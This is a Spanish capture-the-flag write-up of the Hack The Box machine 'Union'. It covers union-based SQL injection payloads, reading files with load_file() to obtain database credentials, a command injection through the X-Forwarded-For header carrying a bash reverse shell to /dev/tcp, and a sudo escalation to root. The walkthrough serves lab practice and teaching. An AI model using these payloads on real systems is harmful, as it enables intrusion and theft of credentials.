---
layout: post
title:  "Maquina Retirada Union de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada UNION
tags: HTB, SQLI, Local File Inclusion, PHP, X-Forwarder-For, Command Injection, Maquinas Retiradas,
---

# Unio n - SQL Injection ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.128       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
 PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
Procedemos a Enumerar los Recursos de la Web con extension .php :
```bash
Target: http://10.10.11.128/FUZZ.php
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000002:   200        42 L     93 W       1220 Ch     "index"                                                                                                                                                                   
000000868:   200        0 L      2 W        13 Ch       "firewall"                                                                                                                                                                
000001477:   200        0 L      0W "config"                                                                                                                                                                
000004086:   200        20 L     61 W       772 Ch      "challenge"
```

Vemos que tenemos un campo vulnerable a Inyecciones SQLI, es importante destacar que0 Nos damos cuenta mediante el uso de los siguientes Payloads
```bash
POST /index.php HTTP/1.1
Host: 10.10.11.128
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 32
Origin: http://10.10.11.128
Connection: close
Referer: http://10.10.11.128/index.php
Cookie: PHPSESSID=g9cr58rofn03mlbo8ouiml4c07

player=admin' union select 1-- -    
```
Respuesta de la Injeccion SQL, en la que vemos que tenemos un solo campo.

```bash
Sorry, "1" you are not eligible due to already qualifying.
```
Procedemos a intentar meterle un segundo payload para enumerar la Base de Datos en la que estamos
```bash
player=admin' union select database()-- -
```

Respuesta
```bash
Sorry, "November" you are not eligible due to already qualifying.
``` 

Como solo tenemos un campo para listar contenido, procedemos a usar la expresion group-concat() 
```bash
player=admin' union select group_concat(schema_name,':') from information_schema.schemata-- -
```
Resppuesta para la enumeracion de Bases de Datos

```bash
Sorry, "mysql:, information_schema:, performance_schema:, sys:, november:" you are not eligible due to already qualifying.
```
Enumeracion de Tablas para la base de datos `November`

```bash
player=admin' union select group_concat(table_name,':') from information_schema.tables where table_schema="November"-- -
```
Resppuesta para la enumeracion de Tablas para la Base de Datos `Ǹovember`

```bash
Sorry, "flag:,players:" you are not eligible due to already qualifying.
```

Enumeracion de Columnas para la Base de Datos `November`
```bash
player=admin' union select group_concat(column_name,':') from information_schema.columns where table_schema="November" and table_name="flag"-- -
```
Respuesta para las Columnas para la Base de Datos `November`

```bash
Sorry, "one:" you are not eligible due to already qualifying.
```
Vemos que solo tenemos una Columna en la Tabla Name `flag` y Base de Datos `November`
Procedemos a listar la data para la columna enumerada `one`

```bash
player=admin' union select one from November.flag-- -
```

Obtenemos la `Data` para la Columna `one` en la Tabla `flag` y en la Base de Datos `November`
```bash
Sorry, "UHC{F1rst_5tep_2_Qualify}" you are not eligible due to already qualifying.
```

Encontramos la flag que nos piden la introducimos en la ruta `/challenge` y vemos que nos abren el el puerto SSH pero no tenemos ninguna usuario ni clave ni na de na para conectarnos.
```bash
Welcome Back!
Your IP Address has now been granted SSH Access.
```

Procedemos a intentar listar informacion tipo `Local File Inclusion` atraves de la `SQLI` 
```bash
player=admin' union select load_file("/var/www/html/index.php")-- -
```

Vemos que listamos el codigo fuente del Archivo  `index.php`

```bash
Sorry, <?php
  require('config.php');
  if ( $_SERVER['REQUEST_METHOD'] == 'POST' ) {

	$player = strtolower($_POST['player']);

	// SQLMap Killer
	$badwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
	foreach ($badwords as $badword) {
		if (preg_match( $badword, $player )) {
			echo 'Congratulations ' . $player . ' you may compete in this tournament!';
			die();
		}
	}

	$sql = "SELECT player FROM players WHERE player = '" . $player . "';";
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_array( $result, MYSQLI_ASSOC);
	if ($row) {
		echo 'Sorry, ' . $row['player'] . " you are not eligible due to already qualifying.";
	} else {
		echo 'Congratulations ' . $player . ' you may compete in this tournament!';
		echo '<br />';
		echo '<br />';
		echo 'Complete the challenge <a href="/challenge.php">here</a>';
	}
	exit;
  }
?>
```

Procedemos a listar informacion del archivo `config.php`

```bash
player=admin' union select load_file("/var/www/html/config.php")-- -
```
Respuesta de la inyeccion SQL `load_file()`

```bash
Sorry, <?php
  session_start();
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-11qual-global-pw";
  $dbname = "november";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
 you are not eligible due to already qualifying.
```

Ya tenemos credenciales para conectarnos por SSH como `uhc` a la maquina.

Procedemos a conectarnos por SSH como el usuario `uhc`:
```bash
$ ssh uhc@10.10.11.128

The authenticity of host '10.10.11.128 (10.10.11.128)' can't be established.
ED25519 key fingerprint is SHA256:hE6H4DrsHebfs+gclhz9SL77tMpy8aKR3vp8Y0NRDvY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.128' (ED25519) to the list of known hosts.
uhc@10.10.11.128's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov  8 21:19:42 2021 from 10.10.14.8
uhc@union:~$ 
```

Nos metemos por SSH a la maquina Victima. Procedemos a Enumerar el Sistema como Siempre:

```bash
uhc@union:~$ id
uid=1001(uhc) gid=1001(uhc) groups=1001(uhc)
uhc@union:~$ whoami
uhc
uhc@union:~$ uname -a
Linux union 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
uhc@union:~$ pwd
/home/uhc
uhc@union:~$ ls -la
total 20
drwxr-xr-x 1 uhc  uhc   108 Nov  8 20:51 .
drwxr-xr-x 1 root root   12 Nov  8 12:37 ..
lrwxrwxrwx 1 root root    9 Nov  8 12:53 .bash_history -> /dev/null
-rw-r--r-- 1 uhc  uhc   220 Nov  8 12:37 .bash_logout
-rw-r--r-- 1 uhc  uhc  3771 Nov  8 12:37 .bashrc
drwx------ 1 uhc  uhc    40 Nov  8 20:51 .cache
-rw-r--r-- 1 uhc  uhc   807 Nov  8 12:37 .profile
-rw-r--r-- 1 root root   33 Jan 11 17:08 user.txt
```

Vemos que tendriamos la flag de `user.txt`

```bash
$ cat user.txt 
xxxxxxxxxx0de443fd002fa4a79aa
```

Nos movemos a la ruta `/var/wwww/html/` listamos el archivo `firewall.php`:
```bash
$ cat firewall.php 
<?php
require('config.php');

if (!($_SESSION['Authenticated'])) {
  echo "Access Denied";
  exit;
}

?>
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<div class="container">
                <h1 class="text-center m-5">Join the UHC - November Qualifiers</h1>

        </div>
        <section class="bg-dark text-center p-5 mt-4">
                <div class="container p-5">
"
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?> "
              <h1 class="text-white">Welcome Back!</h1>
              <h3 class="text-white">Your IP Address has now been granted SSH Access.</h3>
                </div>
        </section>
</div>
```

Encontramos que en el archivo `firewall.php` hay un condicional en el que si encuentra en la peticion la cabecera `X-FORWARDER-FOR` procede a setear 
nuestra IP. Una vez setea nuestra IP vemos que hace lo siguiente.

Comparacion para pillar la IP

```bash
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
```

Ejecucion a nivel de sistema , donde vemos que el parametro `$ip` es vulnerable a `Command Injection`

```bash
system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
```

Procedemos a inteceptar una peticion a la ruta `/firewall.php` a nivel web con `Burpsuite`

```bash
GET /firewall.php HTTP/1.1
Host: 10.10.11.128
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=5lool1v1b56bq1tf6n9bisijau
Upgrade-Insecure-Requests: 1
" X-FORWARDER-FOR: 1.1.1.1; ping -c 1 10.10.16.7 ; "
```

Nos ponemos a la escucha por nuestra consola con `tcpdump -i tun0` :

```bash
tcpdump -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:10:34.071410 IP 10.10.16.7.48718 > 10.10.11.128.http: Flags [S], seq 1366744572, win 64240, options [mss 1460,sackOK,TS val 2534213280 ecr 0,nop,wscale 7], length 0
20:10:34.144336 IP 10.10.11.128.http > 10.10.16.7.48718: Flags [S.], seq 329548905, ack 1366744573, win 65160, options [mss 1355,sackOK,TS val 1232939330 ecr 2534213280,nop,wscale 7], length 0
20:10:34.144354 IP 10.10.16.7.48718 > 10.10.11.128.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2534213353 ecr 1232939330], length 0
20:10:34.144462 IP 10.10.16.7.48718 > 10.10.11.128.http: Flags [P.], seq 1:423, ack 1, win 502, options [nop,nop,TS val 2534213353 ecr 1232939330], length 422: HTTP: GET /firewall.php HTTP/1.1
20:10:34.302406 IP 10.10.11.128.http > 10.10.16.7.48718: Flags [.], ack 423, win 506, options [nop,nop,TS val 1232939489 ecr 2534213353], length 0
```

Vemos que recibimos la traza ICMP correctamente a nuestro equipo, asique procedemos a intentar enviarnos una revershell a nuestro equip:

```bash
GET /firewall.php HTTP/1.1
Host: 10.10.11.128
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.128/challenge.php
Connection: close
Cookie: PHPSESSID=vtlolo0qm5uig3et8q279q9ico
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
X-FORWARDED-FOR: ; ping -c 1 10.10.16.7 && bash -c "bash -i >& /dev/tcp/10.10.16.7/443 0>&1"
```

 Nos ponemos a la escucha con una session de Netcat en Nuestro Equipo para Recibir la conexion entrante.

 ```bash
 nc -vlnp 443                                                                                                                       1 ⨯ 1 ⚙
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.128] 58324
bash: cannot set terminal process group (848): Inappropriate ioctl for device
bash: no job control in this shell
www-data@union:~/html$
```

Vemos que entramos como el `www-data` , enumeramos el sistema para ver como podemos escalar privilegios

```bash
www-data@union:~/html$ sudo -l
Matching Defaults entries for www-data on union:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on union:
    (ALL : ALL) NOPASSWD: ALL
```

Vemos que podemos convertirnos en administradores

```bash
www-data@union:~/html$ sudo -u root /bin/bash
root@union:/var/www/html#
```

Sacamos la Flag Para ROOT

```bash
root@union:/var/www/html# cat /root/root.txt 
7a97deabcc2cef8768d711dxxxxxxxx
```

Maquina Union - SQLI - Code Injection - Pwned 

K0H4ck





















